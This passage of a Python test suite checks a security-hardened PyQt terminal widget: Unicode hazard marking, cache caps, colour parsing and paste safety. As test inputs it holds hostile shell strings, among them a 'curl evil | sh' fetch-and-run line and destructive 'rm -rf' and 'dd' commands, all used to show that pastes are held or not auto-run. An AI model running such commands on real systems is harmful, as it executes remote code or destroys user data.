_sgb.close()

# Cache invalidation: a Show-mode structural cell caches the bypass (fg==bg allowed, the
# glyph is displayed); toggling to a strict mode must re-clamp it -- _rerender drops the
# format caches, which are keyed by codepoint + SGR, not by mode.
_sgc = SecureTerminal(command='/bin/cat', tui=True)
_sgc.apply_mode('show')
_sgc.apply_markings(False)
_sgc.apply_colors(True)
_sgc.resize(600, 300)
_sgc.show()
pump(60)
_sgc._feed_stream(_RED_ON_RED)
_sgc._render_tui()
pump(30)
_scfg_show, _scbg_show = _cell_fg_bg(_sgc, next(
    i for i, ch in enumerate(_sgc.toPlainText()) if ch == '\u2588'))
eq(_scfg_show, _scbg_show,
   'show mode: a displayed structural glyph keeps its program fg==bg (colour ramp intact)')
_sgc.apply_mode('box')
pump(30)
_scfg_box, _scbg_box = _cell_fg_bg(_sgc, _sgc.toPlainText().index('_'))
ok(_scfg_box != _scbg_box,
   'toggling Show->box re-clamps the neutralized structural cell (format caches cleared)')
_sgc.close()

# Q2 by-class colours: a bidi override, a homoglyph and a zero-width each get their
# own class colour + inspectable codepoint in the grid, exactly as CLI box mode.
for _payload, _wantcp, _wantcls in ((chr(0x202E), 0x202E, 'bidi'),
                                    (chr(0x0430), 0x0430, 'confusable'),
                                    (chr(0x200B), 0x200B, 'invisible')):
    _q2 = SecureTerminal(command='/bin/cat', tui=True)
    _q2.apply_mode('box')
    _q2.resize(600, 300)
    _q2.show()
    pump(60)
    _q2._feed_stream(('x' + _payload + 'y\r\n').encode())
    _q2._render_tui()
    pump(30)
    _idx = _q2.toPlainText().index('_')
    _d, _c2, _fg2 = _grid_cell(_q2, _idx)
    eq(_c2, _wantcp, 'Q2 grid: %s box carries its source codepoint' % _wantcls)
    eq(_fg2.lower(), mark_fg(_q2, _wantcls).lower(),
       'Q2 grid: %s box wears the %s risk colour' % (_wantcls, _wantcls))
    # _cp_at parity: hovering the box cell resolves the REAL character, not U+25A1
    eq(_q2._cp_at(glyph_pt(_q2, _idx)), _wantcp,
       'Q2 grid: hover on the %s box resolves the real codepoint (not the box glyph)' % _wantcls)
    _q2.close()

# markings OFF: a neutralized grid cell wears NO risk-class colour (it falls back
# to the program's own SGR), but it STILL carries the source codepoint -- so hover/
# inspection identifies the real character in Box/Detail/Reveal even with markings
# off, at parity with the CLI line renderer (which tags the codepoint regardless).
_moff = SecureTerminal(command='/bin/cat', tui=True)
_moff.apply_mode('box')
_moff.apply_markings(False)
_moff.resize(600, 300)
_moff.show()
pump(60)
_moff._feed_stream(('x' + chr(0x202E) + 'y\r\n').encode())
_moff._render_tui()
pump(30)
_mv = _grid_cell(_moff, _moff.toPlainText().index('_'))
eq(_mv[1], 0x202E,
   'Q2 markings off: a neutralized grid cell still carries the source codepoint (CLI parity)')
ok(_mv[2].lower() not in {s['fg'].lower()
                          for s in _moff.MARKING_COLORS[_moff._theme].values()},
   'Q2 markings off: but wears no risk-class colour (program SGR only)')
_moff.close()

# the marking-format caches are ADMISSION-CAPPED: a flood of distinct non-ASCII
# codepoints (each boxed) cannot grow _grid_mark_cache without bound (the same bound
# sanitize._is_mark uses), so a long-lived tab cannot leak one QTextCharFormat per
# codepoint for the whole session. (CodeRabbit PR #4.)
from secure_terminal.terminal import _MARK_CACHE_MAX                 # noqa: E402


class _FakeCell:                                    # minimal pyte-cell stand-in
    __slots__ = ('data', 'fg', 'bg', 'bold', 'reverse', 'underscore')

    def __init__(self, ch):
        self.data = ch
        self.fg = self.bg = 'default'
        self.bold = self.reverse = self.underscore = False


_cap = SecureTerminal(command='/bin/cat', tui=True)
_cap.apply_mode('box')
for _i in range(_MARK_CACHE_MAX + 300):
    _cap._grid_cell_format(_FakeCell(chr(0x3400 + _i)), _BX)     # distinct CJK, boxed
ok(len(_cap._grid_mark_cache) <= _MARK_CACHE_MAX,
   'grid marking cache is admission-capped under a distinct-codepoint flood (size %d)'
   % len(_cap._grid_mark_cache))
_cap.close()

# _fmt_cache is keyed by (fg, bg, ...) with TRUECOLOR colours, so untrusted SGR spam
# would grow it toward the 2^48 colour space (~178MB observed) -- it is admission-capped
# like the marking caches so a flood cannot leak one QTextCharFormat per colour forever.
_capf = SecureTerminal(command='/bin/cat')
for _i in range(_MARK_CACHE_MAX + 300):
    _fc = _FakeCell('x')
    _fc.fg = '%06x' % _i                # a distinct truecolor foreground each time
    _capf._pyte_format(_fc)
ok(len(_capf._fmt_cache) <= _MARK_CACHE_MAX,
   'the cell-format cache is admission-capped under a truecolor SGR flood (size %d)'
   % len(_capf._fmt_cache))
_capf.close()

# COR-5: an AIXTERM bright-background SGR (100-107) must render a genuinely BRIGHT bg, not
# the dim base. pyte encodes it as base-name bg + bold=True, so the fork disentangles it:
# a bright bg name (no phantom bold that would brighten the fg / bold the font).
if tui_available():
    _bb = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_bb, b'\x1b[107mX')            # bright white background
    _bcell = _bb._screen.buffer[0][0]
    eq(_bcell.bg, 'brightwhite',
       'COR-5: a bright-bg SGR sets a bright bg name (base rendered the dim white)')
    ok(not _bcell.bold,
       'COR-5: a bright-bg-only SGR sets NO phantom bold (no fg-brighten / bold font)')
    _bg_bright = _bb._pyte_qcolor('brightwhite', None)
    ok(_bg_bright is not None
       and _bb._pyte_format(_bcell).background().color().name() == _bg_bright.name(),
       'COR-5: the bright-bg cell renders from the +8 bright palette')
    # order-correctness: a normal bg AFTER a bright-bg wins; a bright-bg after reset wins
    feed_output(_bb, b'\x1b[107;44mY')         # bright-bg then normal blue bg -> blue wins
    eq(_bb._screen.buffer[0][1].bg, 'blue',
       'COR-5: a normal bg after a bright-bg overrides it (in-order)')
    _bb.close()
    # an INCOMPLETE extended-bg selector (48 with no 5;N / 2;R;G;B) must NOT clear a
    # preceding valid bright-bg: only a COMPLETE 48 is a real bg. Pre-fix `101;48`
    # cleared bright_bg unconditionally -> default bg instead of the bright-red. Fresh
    # cell so the pre-fix result is an unambiguous 'default', not a leftover bg.
    _b48 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_b48, b'\x1b[101;48mZ')        # bright-red bg, then a bare (incomplete) 48
    eq(_b48._screen.buffer[0][0].bg, 'brightred',
       'COR-5: an incomplete 48 selector leaves a preceding bright-bg intact (101;48)')
    _b48.close()
    # 38/48 EXTENDED colours: their following params are colour DATA, not opcodes. A component
    # in 100-107 must NOT be misread as a bright-bg code (the base of this fix, 23ff606, did:
    # 38;5;101 set bg=brightred and truncated the fg). Feed each on its own fresh cell.
    _xc = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_xc, b'\x1b[38;5;101mA')       # 256-colour fg, index 101
    _a = _xc._screen.buffer[0][0]
    ok(_a.bg == 'default' and _a.fg != 'default',
       'COR-5: 38;5;101 sets a 256-colour fg, leaves bg default (101 not read as bright-bg)')
    _xc2 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_xc2, b'\x1b[48;2;100;101;102mB')   # truecolour bg 0x646566
    eq(_xc2._screen.buffer[0][0].bg, '646566',
       'COR-5: 48;2;R;G;B sets a truecolour bg (components not read as bright-bg)')
    # branch coverage for the param consumer: attr==48 mode==5, a malformed 38 (no mode), a
    # truncated 38;5 (no index), and a non-5/2 mode (consumes nothing) -- none may crash.
    for _seq in (b'\x1b[48;5;15mC', b'\x1b[38mD', b'\x1b[38;5mE', b'\x1b[38;9;44mF'):
        _xe = SecureTerminal(command='/bin/cat', tui=True)
        feed_output(_xe, _seq)
        ok(isinstance(_xe.toPlainText(), str),
           'COR-5: extended-colour param consumer handles %r without crashing' % _seq)
        _xe.close()
    _xc.close(); _xc2.close()

# Security regression (codex/agy, PR #5 review): a pyte cell can hold a box-drawing
# base PLUS a hidden dangerous code point (bidi / zero-width), which tui_cell
# neutralizes to the box placeholder. The Show-mode structural exemption must NOT fire
# on such a cell -- the box must wear the RISK tint of the real hazard and stay
# inspectable AS it, not be waved through as benign structure because its first code
# point is a line. marking_cp_for_cell now resolves the cell to the worst code point.
_sec = SecureTerminal(command='/bin/cat', tui=True)
_sec.apply_mode('show')
_bidi_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2500) + chr(0x202E)), _BX)
eq(_bidi_fmt.property(_CPP), 0x202E,
   'grid: a box-drawing+bidi cell resolves to the BIDI codepoint (the real hazard)')
eq(_bidi_fmt.foreground().color().name().lower(), mark_fg(_sec, 'bidi').lower(),
   'grid: a neutralized box+bidi cell wears the bidi RISK colour, not the program SGR')
# a confusable box-drawing diagonal (U+2571 -> "/") shown in Show mode keeps its
# confusable tint, not the structural program-colour pass.
_diag_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2571)), chr(0x2571))
eq(_diag_fmt.foreground().color().name().lower(), mark_fg(_sec, 'confusable').lower(),
   'grid: a confusable box-drawing diagonal wears the confusable risk colour')
_sec.close()

# Ctrl+C is echoed locally as ^C (transparency: make the invisible visible) and
# de-duped against a shell that also echoes it (bash's readline), so the user
# always sees exactly one ^C.
cc = SecureTerminal(command='/bin/cat')
cc._feed_line('prompt$ ')
key(cc, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok(cc.toPlainText().endswith('^C'), 'Ctrl+C is locally echoed as ^C')
_dedup = cc._absorb_caret('^C\r\nprompt$ ')          # bash's own ^C, right after
ok(not _dedup.startswith('^C'), 'a shell duplicate ^C in the next output is absorbed')
cc._feed_line(_S.render_output(_dedup, cc.current_mode()))
eq(cc.toPlainText().count('^C'), 1, 'exactly one ^C after Ctrl+C + shell echo (no double)')
cz = SecureTerminal(command='/bin/cat')
cz._feed_line('prompt%')
key(cz, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
_z = cz._absorb_caret('\r\nprompt%')                 # a shell (zsh) that echoes nothing
ok('^C' not in _z, 'nothing removed when the shell does not echo ^C')
eq(cz.toPlainText().count('^C'), 1, 'local ^C preserved for a non-echoing shell')
# real child output that merely CONTAINS ^C after a leading PRINTABLE char must not
# be corrupted -- only a caret leading the chunk (optionally after CR/LF) is a shell
# echo; a program printing "a^C-note" right after the interrupt keeps its bytes
cd2 = SecureTerminal(command='/bin/cat')
key(cd2, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
eq(cd2._absorb_caret('a^C-note'), 'a^C-note',
   'a ^C after a printable char is real output, not absorbed')
# but a genuine shell echo after only a leading CR/LF is still absorbed
cd3 = SecureTerminal(command='/bin/cat')
key(cd3, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok('^C' not in cd3._absorb_caret('\r\n^Cnext'),
   'a shell ^C after a leading CR/LF is still absorbed')

# a restored session tab spawns its shell in the SAVED working directory (cwd),
# so restore returns you to where you were (bug: pwd was not restored).
import tempfile as _tfcwd                                  # noqa: E402


def _wait_cwd(pid, target, tries=60):
    _rt = os.path.realpath(target)
    for _ in range(tries):
        try:
            if os.path.realpath(os.readlink('/proc/%d/cwd' % pid)) == _rt:
                return True
        except OSError:
            ## /proc/<pid>/cwd is not readable until the forked child has
            ## chdir'd and exec'd; poll on, `tries` is the timeout.
            pass
        pump(10)                       # let the forked child chdir + exec
    return False


_cwd_dir = _tfcwd.mkdtemp(prefix='st-cwd-')
_cwt = SecureTerminal(command='/bin/cat', cwd=_cwd_dir)
ok(_wait_cwd(_cwt._pid, _cwd_dir), 'a spawned shell starts in the requested cwd')
eq(os.path.realpath(_cwt.shell_cwd()), os.path.realpath(_cwd_dir),
   'shell_cwd reports the shell working directory')
_cwt.close()
# a vanished cwd must not break the spawn -- it falls back to the inherited dir
_gone = _tfcwd.mkdtemp(prefix='st-gone-')
os.rmdir(_gone)
_cwg = SecureTerminal(command='/bin/cat', cwd=_gone)
pump(30)
ok(_cwg._pid is not None, 'a vanished saved cwd still spawns a shell (fallback)')
_cwg.close()
# shell_cwd returns '' when the shell pid is gone / unreadable (defensive branch)
_cwt2 = SecureTerminal(command='/bin/cat')
_realpid = _cwt2._pid
_cwt2._pid = 2 ** 30           # a pid that does not exist -> os.readlink raises
eq(_cwt2.shell_cwd(), '', 'shell_cwd returns empty when the shell pid is unreadable')
_cwt2._pid = _realpid          # restore so close() reaps the real child
_cwt2.close()
# regression: output that fills the reported width hard-wraps (real autowrap), so
# a shell's width-padded end-of-line marker (zsh PROMPT_SP / PROMPT_EOL_MARK) and
# the following prompt do not collapse onto one logical line -- which lost the
# last line of a file printed without a trailing newline.
aw = SecureTerminal(command='/bin/cat')
aw._cols = 40
aw._feed_line('END}' + '%' * 40 + '\rprompt$ ')      # }, a width-filling marker, CR, prompt
_awlines = aw.toPlainText().split('\n')
ok(any('END}' in ln for ln in _awlines),
   'content before a width-filling marker survives (autowrap, not collapse)')
ok(len(_awlines) >= 2,
   'output filling the reported width hard-wraps instead of collapsing under a bare CR')
# and a soft-autowrapped line copies JOINED (no spurious newline at the wrap),
# like a real terminal -- the wrap-continuation block is marked and joined.
cwp = SecureTerminal(command='/bin/cat')
cwp._cols = 5
cwp._feed_line('abcdefgh\n')                          # 8 chars at width 5 -> wraps
cwp.selectAll()
_copied = cwp.createMimeDataFromSelection().text()
ok('abcdefgh' in _copied, 'a soft-wrapped line copies joined (no wrap newline)')
ok('abcde\nfgh' not in _copied, 'the wrap point is not a newline in the copy')
# copying a slice that starts AFTER an astral char must land on the right cell:
# QTextCursor positions are UTF-16 units (an astral glyph is two), so a Python
# str-offset slice would mis-cut. Show mode keeps the glyph as one code point.
cap = SecureTerminal(command='/bin/cat')
cap.apply_mode('show')
cap._feed_line('\U0001f600X\n')                      # emoji (2 UTF-16 units) + X
_capcur = cap.textCursor()
_capcur.setPosition(2)                                # just past the emoji
_capcur.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
cap.setTextCursor(_capcur)
ok(cap.createMimeDataFromSelection().text() == 'X',
   'a selection after an astral char copies the right cell (UTF-16 aware)')

# regression (box<->show reflow): a neutralized cell is ONE narrow box, but the
# glyph it stands for can be WIDER (a CJK/emoji renders ~1.7x a plain cell in the
# shipped Hack font). Under the old pixel WidgetWidth wrap a line that fit in Box
# re-wrapped in Show and the wide glyph jumped to the next line on a mode toggle.
# NoWrap makes the terminal's own column model (feed_line_edits at self._cols) the
# SOLE wrap authority -- mode-independent -- so the glyph keeps its line/column.
_rf = SecureTerminal(command='/bin/cat')
_rf.document().setDocumentMargin(0)
_rffm = _rf.fontMetrics()
_rfcw = _rffm.horizontalAdvance('M')
_rfwide = _rffm.horizontalAdvance('\U0001f600')       # emoji: wider than a cell
_rfN = 10
# a viewport BETWEEN the box-line width (N+1 narrow cells) and the show-line width
# (N narrow + one wide glyph): the old pixel wrap broke Show here but not Box.
_rfvw = int(_rfN * _rfcw + (_rfwide + _rfcw) / 2)
_rf.resize(_rfvw + 4, 300)
_rf.show()
APP.processEvents()
while _rf.viewport().width() > _rfvw and _rf.width() > 20:
    _rf.resize(_rf.width() - 1, 300)
    APP.processEvents()
_rf._cols = 500                                       # do not hard-wrap this short line
_rf._mode = 'box'
_rf._feed_line('M' * _rfN + '\U0001f600')
APP.processEvents()


def _rf_visual_lines(t):
    lay = t.document().documentLayout()
    return round(lay.blockBoundingRect(t.document().begin()).height()
                 / t.fontMetrics().height())


_rf_box_lines = _rf_visual_lines(_rf)
_rf.apply_mode('show')
APP.processEvents()
_rf_show_lines = _rf_visual_lines(_rf)
ok(_rfwide <= _rfcw or (_rf_box_lines == 1 and _rf_show_lines == 1),
   'box<->show keeps a wide glyph on the same line -- no reflow (NoWrap authority)')
_rf.close()

# regression (Fix #4): CLI paints are DEBOUNCED to ~60fps by a single-shot timer,
# so a live read does not rebuild the document immediately -- but a save/teardown
# must FLUSH the pending paint or the last unpainted line is lost.
## A1: Resource leaks (pty child master fd). Close original fd before overwriting.
_db = SecureTerminal(command='/bin/cat')
_db._mode = 'show'
_dbr, _dbw = os.pipe()
if _db._fd is not None:
    os.close(_db._fd)
_db._fd = _dbr
os.write(_dbw, b'debounced-last-line')
os.close(_dbw)
_db._on_readable()                                    # live read -> deferred paint
_db._fd = None
os.close(_dbr)
ok(_db.document().toPlainText() == '',
   'a live CLI read debounces the paint (the Qt document is not rebuilt yet)')
ok('debounced-last-line' in _db.transcript_text(),
   'transcript_text flushes the pending paint, so a save never misses the last line')
_db.close()
# A read notifier can fire AFTER teardown closed the fd (_fd set to None): _on_readable
# must be a no-op then, not os.read(None) -> TypeError (an uncaught type error that
# BlockingIOError/OSError do not catch).
_rn = SecureTerminal(command='/bin/cat')
_rn._fd = None
_rn_raised = False
try:
    _rn._on_readable()
except Exception:                                     # noqa: BLE001
    _rn_raised = True
ok(not _rn_raised,
   '_on_readable is a no-op when the fd is already closed (teardown-race guard)')
_rn.close()
# shutdown flushes too, so the last line survives teardown
_db2 = SecureTerminal(command='/bin/cat')
_db2._mode = 'show'
_dbr2, _dbw2 = os.pipe()
if _db2._fd is not None:
    os.close(_db2._fd)
_db2._fd = _dbr2
os.write(_dbw2, b'teardown-last-line')
os.close(_dbw2)
_db2._on_readable()
_db2._fd = None
os.close(_dbr2)
_db2.shutdown()
ok('teardown-last-line' in _db2.document().toPlainText(),
   'shutdown flushes the pending paint, so the last line survives teardown')
# gap1 (ai-review): the PRIMARY-selection / drag path strips to ASCII even in Show
# mode -- a homoglyph must not reach a middle-click paste / drop target unreviewed
# (the copy review only covers Ctrl+C).
_prim = SecureTerminal(command='/bin/cat')
_prim.apply_mode('show')
_prim._feed_line('pa' + chr(0x0430) + 'l\n')          # Cyrillic 'a' homoglyph kept in Show
_pcur = _prim.textCursor()
_pcur.setPosition(0)
_pcur.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
_prim.setTextCursor(_pcur)
ok(all(ord(c) < 128 for c in _prim.createMimeDataFromSelection().text()),
   'gap1: the PRIMARY-selection/drag path strips non-ASCII (no unreviewed homoglyph)')
_prim.close()
# --- inspect popups: a marked character carries its source codepoint, so the
# hover tooltip and the double-click popup can describe it in EVERY mode ---------
from secure_terminal.terminal import _CP_PROP            # noqa: E402
from PyQt6.QtWidgets import QLabel, QPushButton           # noqa: E402
from PyQt6.QtGui import QGuiApplication                   # noqa: E402


def _fmt_cp(term, index):
    _c = QTextCursor(term.document())
    _c.setPosition(index)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    return _c.charFormat().property(_CP_PROP)


ins = SecureTerminal(command='/bin/cat')
ins.apply_mode('box')
ins._append('a' + chr(0x202E) + 'b')                     # RLO between two ASCII
eq(ins.toPlainText(), 'a_b', 'box shows the RLO override as "_"')
eq(_fmt_cp(ins, 1), 0x202E, 'even the box "_" carries the source codepoint (RLO)')
inr = SecureTerminal(command='/bin/cat')
inr.apply_mode('reveal')
inr._append(chr(0x20AC))                                 # euro sign
eq(_fmt_cp(inr, 0), 0x20AC, 'a reveal badge carries the source codepoint (euro)')
# _cp_at (the real hover/click hit-test) recovers it from a viewport point. The
# badge is 8 cells wide and every cell carries the tag, so a mid-badge point is a
# stable target regardless of exact glyph metrics.
inr.resize(600, 200)
inr.show()
pump(30)
_badge_pt = glyph_pt(inr, 4)                            # inside "<U+20AC>"
eq(inr._cp_at(_badge_pt), 0x20AC, '_cp_at recovers the codepoint under a point (reveal)')
# and in SHOW mode a readable glyph keeps no tag but IS its own codepoint: _cp_at
# falls back to the character itself (three copies give a stable mid target).
insh = SecureTerminal(command='/bin/cat')
insh.apply_mode('show')
insh._append(chr(0x0416) * 3)                            # Cyrillic Zhe, printable
insh.resize(600, 200)
insh.show()
pump(30)
eq(insh._cp_at(glyph_pt(insh, 1)), 0x0416,
   '_cp_at reads a shown glyph via its own codepoint (show mode, no tag)')
# markings off + ANSI colours on: the marking keeps the program's own foreground
# (not dropped to a blank format) and still carries the codepoint (codex P2 fix).
from PyQt6.QtCore import QPoint                           # noqa: E402
_sgrk = tuple(sorted({'fg': 1, 'bg': None, 'bold': False}.items()))
_mfmt = SecureTerminal(command='/bin/cat')._fmt_from_key((_S.MARK_KEY, _sgrk, 0x202E))
eq(_mfmt.foreground().color().name(), '#cd0000',
   'markings off + colours on keeps the program ANSI colour on the marking')
eq(_mfmt.property(_CP_PROP), 0x202E, 'and the marking still carries the codepoint')
# the hit-test targets ONLY the character under the point, never its neighbour: a
# point over "_" reads the RLO, a point over the adjacent ASCII reads nothing
# (codex P2: probing both sides bled the popup into adjacent glyphs).
inb = SecureTerminal(command='/bin/cat')
inb.apply_mode('box')
inb._append('a' + chr(0x202E) + 'b')                     # -> 'a_b'
inb.resize(600, 200)
inb.show()
pump(30)


def _midpt(term, i):
    _c0 = QTextCursor(term.document())
    _c0.setPosition(i)
    _c1 = QTextCursor(term.document())
    _c1.setPosition(i + 1)
    _r0 = term.cursorRect(_c0)
    _r1 = term.cursorRect(_c1)
    return QPoint((_r0.x() + _r1.x()) // 2, _r0.center().y())


eq(inb._cp_at(_midpt(inb, 1)), 0x202E, 'a point over "_" reads the RLO codepoint')
ok(inb._cp_at(_midpt(inb, 0)) is None, 'a point over the adjacent "a" is not the marking')
ok(inb._cp_at(_midpt(inb, 2)) is None, 'a point over the adjacent "b" is not the marking')
# _run_cp_at's no-run fall-through: a position in a block that no run covers (an
# empty grid document right after a reset) has no source code point.
_ecp = SecureTerminal(command='/bin/cat', tui=True)
_ecp.apply_mode('show')
_ecp.resize(300, 200)
_ecp.show()
pump(20)
_ecp._reset_grid_view()                                  # empty document, no runs
ok(_ecp._run_cp_at(0) is None,
   '_run_cp_at returns None where no run covers the position (empty grid)')
_ecp.shutdown()
# an astral glyph (2 UTF-16 units) in show mode is hit-tested as ONE character:
# the whole code point, never a lone surrogate half (codex P2 fix).
ina = SecureTerminal(command='/bin/cat')
ina.apply_mode('show')
ina._append('x' + chr(0x1F600) + 'y')                    # emoji between two ASCII
ina.resize(600, 200)
ina.show()
pump(30)
_ea = QTextCursor(ina.document())
_ea.setPosition(1)                                       # boundary before the emoji
_eb = QTextCursor(ina.document())
_eb.setPosition(3)                                       # boundary after its 2 units
_emid = QPoint((ina.cursorRect(_ea).x() + ina.cursorRect(_eb).x()) // 2,
               ina.cursorRect(_ea).center().y())
eq(ina._cp_at(_emid), 0x1F600, 'a whole astral glyph is recovered (not a lone surrogate)')
# the active popup describes the character and copies its ESCAPE (never the raw
# glyph -- putting a bidi override / homoglyph on the clipboard is the hazard).
ins._show_char_popup(0x202E, ins.mapToGlobal(ins.rect().center()))
eq(ins._char_popup.windowTitle(), 'Character U+202E', 'popup is titled by codepoint')
_lbl = ins._char_popup.findChild(QLabel)
ok('RIGHT-TO-LEFT OVERRIDE' in _lbl.text() and 'bidirectional' in _lbl.text(),
   'popup names the character and its risk class')
_copy = [b for b in ins._char_popup.findChildren(QPushButton)
         if b.text().startswith('Copy')][0]
_copy.click()
eq(QGuiApplication.clipboard().text(), '\\u202e',
   'copy puts the \\uXXXX escape (not the raw glyph) on the clipboard')
ins._char_popup.close()
# a double-click on a marking opens its popup; elsewhere it falls through
_dc = []
ins._show_char_popup = lambda cp, pt: _dc.append(cp)
ins._cp_at = lambda pos: 0x202E
_dbl = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(5, 5), QPointF(5, 5),
                   Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                   Qt.KeyboardModifier.NoModifier)
ins.mouseDoubleClickEvent(_dbl)
eq(_dc, [0x202E], 'double-click on a marking opens its inspection popup')
# line mirror + paste safety at a bare CLI prompt. The terminal here runs /bin/cat,
# which only echoes -- no typed string is ever executed.
cw = SecureTerminal(command='/bin/cat')
_hsent = spy_writes(cw)
# The line mirror tracks typed input at a bare shell prompt (no foreground program);
# simulate it (a real login-shell tab reads has_foreground_program() False there).
cw.has_foreground_program = lambda: False


def _htype(term, text):
    for _ch in text:
        key(term, Qt.Key.Key_A, _ch)


_htype(cw, 'ls')
key(cw, Qt.Key.Key_Return)
ok(b'\r' in _hsent, 'Enter submits the typed line')
_hsent.clear()

# Ctrl+\ (SIGQUIT): whether the tty flushes or RETAINS the pending line is tty/shell-
# dependent (NOFLSH off flushes; `stty noflsh` or bash trapping SIGQUIT RETAINS it) and
# unobservable to us. So the line is marked UNVERIFIABLE, keeping _line_pending() aware a
# retained line may sit at the prompt (so a CR-terminated re-export is not typed onto it).
_sq = SecureTerminal(command='/bin/cat')
_sq.has_foreground_program = lambda: False
_sqs = spy_writes(_sq)
_htype(_sq, 'safe')
ok(_sq._line_buffer == 'safe', 'the mirror holds the typed prefix before Ctrl+\\')
key(_sq, Qt.Key.Key_Backslash, mods=Qt.KeyboardModifier.ControlModifier)
ok(b'\x1c' in b''.join(_sqs), 'Ctrl+\\ sends SIGQUIT (0x1c) to the child')
ok(_sq._line_dirty,
   'Ctrl+\\ marks the line unverifiable (SIGQUIT may RETAIN the line under noflsh)')
_sq.close()

# desync fail-safe: Tab completion and readline control edits rewrite the shell's line
# without updating _line_buffer, so the mirror is marked unverifiable -- _line_pending()
# must then assume the prompt holds text it cannot see.
_ctrl_mod = Qt.KeyboardModifier.ControlModifier
cw._line_buffer = 'dd of=/dev/sd'
cw._line_dirty = False
key(cw, Qt.Key.Key_Tab, '\t')
ok(cw._line_dirty, 'Tab completion marks the line unverifiable')
cw._line_dirty = False
key(cw, Qt.Key.Key_A, mods=_ctrl_mod)                # Ctrl+A: move-to-start (readline)
ok(cw._line_dirty, 'a readline control edit (Ctrl+A) marks the line unverifiable')
cw._line_dirty = False
key(cw, Qt.Key.Key_BracketRight, '\x1d', mods=_ctrl_mod)   # generic control edit
ok(cw._line_dirty, 'a generic control edit marks the line unverifiable')
cw._line_dirty = False
cw._line_buffer = 'x'
key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
ok(not cw._line_dirty and cw._line_buffer == '',
   'Ctrl+U discards the line and stays clean (nothing stale)')
# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-start),
# so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can leave a survivor
# in the shell, so _line_pending() must keep reporting the prompt as held.
cw._line_buffer = 'rm -rf ~/important'
cw._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
ok(cw._line_dirty,
   'Ctrl+U after a cursor move STAYS dirty -- a survivor still reads as held')
cw._line_dirty = False

# paste can NEVER auto-execute. A SINGLE-line paste (with or without a trailing newline)
# is delivered with its trailing submit stripped, so it lands at the prompt un-entered;
# since _line_buffer never saw those bytes, the line is marked unverifiable (so
# _line_pending() treats the prompt as held). A MULTI-line paste (a hidden second
# command) is HELD for review first.
from PyQt6.QtCore import QMimeData as _QMimePaste          # noqa: E402
cw.apply_paste_warn('unicode')       # (reuse the _hsent spy set up above)
_hsent.clear()
cw._line_dirty = False
_pmnl = _QMimePaste()
_pmnl.setText('rm -rf /tmp/x\n')                     # single-line + trailing newline
cw.insertFromMimeData(_pmnl)
ok(not cw.review_pending(),
   'a single-line paste is not held (it cannot auto-run once the submit is stripped)')
eq(_hsent, [b'rm -rf /tmp/x'],
   'a single-line paste reaches the shell WITHOUT its trailing submit -- no auto-run')
ok(cw._line_dirty,
   'a paste marks the line unverifiable (held for _line_pending)')
_hsent.clear()
cw._line_dirty = False
_pmins = _QMimePaste()
_pmins.setText('ls -la')                             # no newline: inserts into the line
cw.insertFromMimeData(_pmins)
ok(cw._line_dirty, 'a non-submitting paste marks the line dirty')
_hsent.clear()
# a MULTI-line paste carries a hidden second command that a bare dispatch would
# auto-run: it is HELD for review whatever the warn setting.
cw._line_buffer = ''
cw._line_dirty = False
_pmml = _QMimePaste()
_pmml.setText('echo one\ncurl evil | sh\n')
cw.insertFromMimeData(_pmml)
ok(cw.review_pending() and not _hsent,
   'a multi-line paste is held for review before any command can run')
cw.dispatch_pending_paste('reject')
eq(_hsent, [], 'rejecting the held multi-line paste sends nothing')
# even on a clean line a paste never submits: the pasted text sits at the prompt and the
# line is marked unverifiable. _line_buffer is untouched, _line_dirty is set.
cw._line_buffer = 'echo '                            # already typed at the prompt
cw._line_dirty = False
_pmsub = _QMimePaste()
_pmsub.setText('ok\n')
cw.insertFromMimeData(_pmsub)
ok(not cw.review_pending(), 'a single-line paste on a clean line is not held')
eq(_hsent, [b'ok'], 'the paste lands at the prompt with no trailing submit')
ok(cw._line_dirty and cw._line_buffer == 'echo ',
   'the pasted text is unverifiable, buffer intact')
_hsent.clear()
# a TUI-mode paste does not touch the line-mode command, so never sets the flag.
_tuipaste = SecureTerminal(command='/bin/cat', tui=True)
_tuipaste._line_dirty = False
_pmt = _QMimePaste()
_pmt.setText('ls')
_tuipaste.insertFromMimeData(_pmt)
ok(not _tuipaste._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
# TUI handler: Ctrl+U must PRESERVE an already-dirty flag (its reach is cursor-dependent),
# so _line_pending() keeps deferring a re-export. Ctrl+C (SIGINT) still settles the line.
_tuictrl = Qt.KeyboardModifier.ControlModifier
_tuipaste.has_foreground_program = lambda: False
_tuipaste._line_dirty = True
key(_tuipaste, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
ok(_tuipaste._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty')
_tuipaste._line_dirty = True
key(_tuipaste, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
ok(not _tuipaste._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')

# a CLI paste leaves the pasted command un-mirrored at the prompt, so _line_pending()
# must report a held prompt -- otherwise a later mode switch / line_edits toggle types the
# CR-terminated re-export onto the paste and auto-submits it.
_nh = SecureTerminal(command='/bin/cat')
ok(not _nh.tui_active(), 'the widget is a CLI terminal')
ok(not _nh._line_pending(), 'a fresh clean prompt is not pending')
_nh._line_dirty = False
